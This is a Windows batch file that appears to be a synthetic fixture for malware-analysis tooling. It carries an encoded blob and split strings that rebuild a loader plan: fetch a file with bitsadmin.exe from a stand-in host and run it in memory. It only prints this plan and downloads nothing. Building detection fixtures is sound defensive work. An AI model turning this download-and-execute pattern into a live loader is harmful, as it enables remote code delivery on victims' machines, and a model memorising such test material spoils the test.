@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|reverse_xor
rem HUNTRESS-MATERIAL:=UkDC8EQHZ1QA5gUQJkRaFkVsFkVex1RW9xVaB0QSdEUbxmXW5FXBp0TSdlUDdkVB5QUadEQSdlXa1VHWtkVPB0RSRlVsBFXG11ROIwTUFkUDtlDQFEXABEbfJVXUZkUUZ1TdZ1SHx2XS1FVGJFVW5QXc1lVPBlUeNkUaRVXsp1VOAlUeNkUaRVXeAgVQVwCVRQAXdwTGF0XOs1RHNEQJwBHAYFUFsQVEEwVH0hVLJlXD9lVdoVXFJ1XadFHAUVBLMgVSdQHXJ1R
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "h0=v=1|steps=acquire_remote,dispatch_memory|adapter=b"& rem HUNTRESS quote compound
set "h1=itsadmin.exe|stage_count=1|graph=cross_language|ne"& rem HUNTRESS quote compound
set "h2=xt_language=none|campaign_id=campaign-3ec68f72d4|u"& rem HUNTRESS quote compound
set "h3=rl=https://3ec68f72d4.example.invalid/3f680ea4.dat"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
set "neutral_opaque_branch=81c1200c"
call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "cfg=!h0!!h1!!h2!!h3!"
exit /b 0
:HUNTRESS_EMIT
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe GET https://3ec68f72d4.example.invalid/3f680ea4.dat then dispatch memory
exit /b 0
